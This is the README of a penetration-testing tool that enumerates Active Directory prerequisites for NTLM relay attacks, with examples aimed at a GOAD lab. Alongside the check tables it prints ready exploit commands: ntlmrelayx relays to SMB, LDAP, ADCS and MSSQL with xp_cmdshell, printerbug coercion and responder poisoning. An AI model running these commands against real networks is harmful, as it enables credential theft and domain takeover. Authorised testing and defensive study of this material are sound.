# RelayRecon — NTLM Relay Prerequisite Checker

Automated tool to check whether a target Active Directory environment meets the prerequisites for common NTLM and Kerberos relay attacks.

---

## ⚠️ Scope and Intended Use

**RelayRecon is a passive reconnaissance tool. It does not perform any exploitation.**

All checks are read-only enumeration queries — no authentication is coerced, no tickets are relayed, no objects are modified, and no payloads are executed. Command suggestions shown in the output (e.g. `printerbug.py`, `ntlmrelayx.py`) are informational text only and are never run by the tool.

This distinction matters in professional engagements where recon and exploitation require separate authorisation. RelayRecon falls entirely within the recon phase.

**What RelayRecon does:**
- Queries SMB/LDAP/HTTP service state (read-only)
- Checks port reachability
- Reads AD attributes (MachineAccountQuota, DFL, computer objects)
- Runs certipy/nxc in enumeration mode only

**What RelayRecon does NOT do:**
- Trigger authentication from any target machine
- Relay any credentials or tickets
- Write to any AD object
- Execute PrinterBug, PetitPotam, or any other coercion tool
- Run ntlmrelayx, krbrelayx, or any relay tool

---

## Quick Start

```bash
# Install Python dependencies
pip install -r requirements.txt

# Basic run
python relayrecon.py \
  -d corp.local \
  --dc-ip 10.10.10.1 \
  -u lowpriv \
  -p password123 \
  --extra-targets 10.10.10.20 \
  --attacker-ip 10.10.10.99 \
  -v
```

---

## Usage

```
python relayrecon.py [options]

Target:
  -d, --domain         Target domain (e.g. sevenkingdoms.local)      [required]
  --dc-ip              Primary Domain Controller IP                   [required]
  --extra-targets      Comma-separated IPs of member servers/workstations
  --attacker-ip        Your Kali/attacker IP (for WebDAV relay check)

Credentials:
  -u, --username       Domain username (low-privilege account)        [required]
  -p, --password       Plaintext password           [required unless --nt-hash]
  --nt-hash            NT hash for pass-the-hash

Options:
  -v, --verbose        Show per-check details in terminal
  --parallel           Run attack checks in parallel (faster)
  --timeout N          Network timeout in seconds (default: 10)
  -o, --output FILE    Markdown report path (default: <domain>_ntlm_relay_report.md)
  --no-report          Skip writing Markdown report
```

### GOAD Full Lab Example

```bash
# Kingslanding / sevenkingdoms.local
python checker.py -d sevenkingdoms.local --dc-ip 192.168.164.10 \
    -u cersei -p cersei \
    --attacker-ip 192.168.164.30 -v

# North / north.sevenkingdoms.local (with CastleBlack member server)
python checker.py -d north.sevenkingdoms.local --dc-ip 192.168.164.11 \
    -u jon.snow -p iknownothing \
    --extra-targets 192.168.164.22 \
    --attacker-ip 192.168.164.30 -v -o north_report.md

# Essos
python checker.py -d essos.local --dc-ip 192.168.164.12 \
    -u jorah.mormont -p h3IsInLove! \
    --extra-targets 192.168.164.23 \
    --attacker-ip 192.168.164.30 -v -o essos_report.md

# Pass-the-hash
python checker.py -d sevenkingdoms.local --dc-ip 192.168.164.10 \
    -u cersei --nt-hash aad3b435b51404eeaad3b435b51404ee:HASH
```

---

## Attacks Checked

### 1. NTLM Relay → SMB (secretsdump)

Relay NTLM authentication to SMB on a target where signing is disabled. Allows secretsdump-style extraction of SAM/LSA/NTDS.

| Check | Required | Method |
|-------|----------|--------|
| SMB signing disabled on ≥1 target | ✅ | `nxc smb` — parse `signing:False` |
| NTLM authentication enabled | ✅ | `nxc smb` — check auth success |
| Non-DC SMB target reachable | ⚠️ Optional | TCP port 445 check |
| Null/guest session allowed | ⚠️ Optional | `nxc smb -u '' -p ''` |

**Exploit:** `ntlmrelayx.py -tf unsigned_hosts.txt -smb2support`

---

### 2. NTLM Relay → LDAP (Shadow Credentials / RBCD)

Relay NTLM to LDAP to write `msDS-KeyCredentialLink` (Shadow Creds) or `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) on a target computer object.

| Check | Required | Method |
|-------|----------|--------|
| LDAP signing not enforced | ✅ | `nxc ldap --module ldap-checker` |
| LDAP channel binding not required | ✅ | `nxc ldap --module ldap-checker` |
| Writable target object exists | ✅ | `bloodyAD get children` / ldap3 |
| MachineAccountQuota > 0 | ⚠️ Optional | `nxc ldap --module maq` / ldap3 |
| Domain functional level ≥ 2016 | ⚠️ Optional | ldap3 `msDS-Behavior-Version` |

**Exploit:** `ntlmrelayx.py -t ldap://<dc> --shadow-credentials --shadow-target <computer>`

---

### 3. NTLM Relay → ADCS (ESC8)

Relay to AD CS web enrollment (certsrv) over HTTP. Allows enrolling a certificate on behalf of the relayed account (e.g. DC machine account → domain persistence).

| Check | Required | Method |
|-------|----------|--------|
| AD CS deployed in domain | ✅ | `nxc ldap --module adcs` / certipy / ldap3 |
| Web enrollment HTTP endpoint reachable | ✅ | TCP port 80 + HTTP GET `/certsrv/` |
| certsrv uses NTLM auth (not Kerberos-only) | ✅ | `WWW-Authenticate: NTLM` header |
| certipy confirms ESC8 | ⚠️ Optional | `certipy-ad find -vulnerable` |
| HTTPS certsrv EPA status | ⚠️ Optional | Manual registry check |

**Exploit:** `ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController`

---

### 4. NTLM Relay → MSSQL

Relay NTLM to SQL Server. Allows `xp_cmdshell` execution or data access depending on privileges of the relayed account.

| Check | Required | Method |
|-------|----------|--------|
| MSSQL port reachable (TCP 1433) | ✅ | TCP check + UDP 1434 SQL Browser |
| MSSQL accepts Windows/NTLM auth | ✅ | `nxc mssql --windows-auth` |
| SQL user has sysadmin privilege | ⚠️ Optional | `nxc mssql -q "SELECT IS_SRVROLEMEMBER('sysadmin')"` |
| Linked servers exist | ⚠️ Optional | `nxc mssql -q "SELECT ... sys.servers"` |

**Exploit:** `ntlmrelayx.py -t mssql://<host> -smb2support -q "EXEC xp_cmdshell 'whoami'"`

---

### 5. NTLM Relay → HTTP/WebDAV

Coerce a Windows machine to authenticate via WebDAV (HTTP + NTLM), bypassing SMB signing. The WebClient service must be running on the target.

| Check | Required | Method |
|-------|----------|--------|
| WebClient service running on ≥1 target | ✅ | `nxc smb --module webdav` |
| HTTP relay listener port accessible | ✅ | TCP port 80 on attacker |
| SMB signing enforced (bypass needed) | ⚠️ Optional | `nxc smb` signing check |
| Coercion method available (PrinterBug/PetitPotam) | ⚠️ Optional | `nxc smb --module spooler` |
| LLMNR/NBT-NS poisoning possible | ⚠️ Optional | Responder presence check |

**Exploit:**
```bash
# Listen
ntlmrelayx.py -t ldap://<dc> --http-port 80

# Coerce (PrinterBug)
printerbug.py <domain>/<user>:<pass>@<target> <attacker>@80/x

# OR coerce with responder (WebDAV via LLMNR)
responder -I eth0
```

---

## Viability Logic

| Result | Meaning |
|--------|---------|
| ✅ VIABLE | All required prerequisites met |
| ⚠️ PARTIAL | Required checks pass but optional checks failed, or some checks were skipped |
| ❌ NOT VIABLE | At least one required check failed |
| ❓ UNKNOWN | All checks were skipped/errored |

---

## External Tools Used

The checker calls these tools if they're installed. Gracefully falls back or skips if not found.

| Tool | Install | Used for |
|------|---------|----------|
| `nxc` / `netexec` | `apt install netexec` | SMB/LDAP/MSSQL checks |
| `certipy-ad` | `pip install certipy-ad` | ADCS ESC8 detection |
| `bloodyAD` | `pip install bloodyad` | LDAP ACL/object checks |
| `smbclient` | `apt install smbclient` | Null session check |
| `responder` | pre-installed on Kali | LLMNR detection |
| `ldap3` | `pip install ldap3` | Direct LDAP queries |

---

## Architecture

```
ntlm_relay_checker/
├── checker.py          Entry point, argparse, orchestrator
├── config.py           TargetEnv + Credential dataclasses
├── engine.py           run_all_checks() + parallel runner
├── output.py           Rich terminal table + Markdown writer
└── checks/
    ├── base.py         BaseCheck, CheckResult, AttackResult, Status
    ├── smb.py          SMB relay checks
    ├── ldap.py         LDAP relay checks (Shadow Creds / RBCD)
    ├── adcs.py         ADCS ESC8 checks
    ├── mssql.py        MSSQL relay checks
    └── webdav.py       WebDAV/HTTP relay checks
```

---

## Sample Output

```
╭──────────────────────────────────────────────────────────────╮
│  NTLM Relay Prerequisite Checker                             │
│  Attack viability summary                                    │
╰──────────────────────────────────────────────────────────────╯

╭──────────────────────────────────────┬──────────────┬─────────────────────────────────┬──────────────────────╮
│ Attack                               │   Viable?    │ Failed Prerequisites            │ Warnings / Skipped   │
├──────────────────────────────────────┼──────────────┼─────────────────────────────────┼──────────────────────┤
│ NTLM Relay → SMB (secretsdump)       │ ✅ VIABLE    │ —                               │ —                    │
│ NTLM Relay → LDAP (Shadow Creds)     │ ⚠️ PARTIAL   │ —                               │ Writable object      │
│ NTLM Relay → ADCS (ESC8)            │ ❌ NOT VIABLE │ Web enrollment HTTP endpoint    │ —                    │
│ NTLM Relay → MSSQL                  │ ❌ NOT VIABLE │ MSSQL port reachable            │ —                    │
│ NTLM Relay → HTTP/WebDAV            │ ✅ VIABLE    │ —                               │ Coercion method      │
╰──────────────────────────────────────┴──────────────┴─────────────────────────────────┴──────────────────────╯
```

---

## Notes

- Designed for use with a **single low-privilege domain account**
- All checks are **read-only** — no exploitation, no modifications
- WARN/SKIP checks should be verified manually
- Exit code: `0` if any attack is VIABLE/PARTIAL, `1` if none are viable
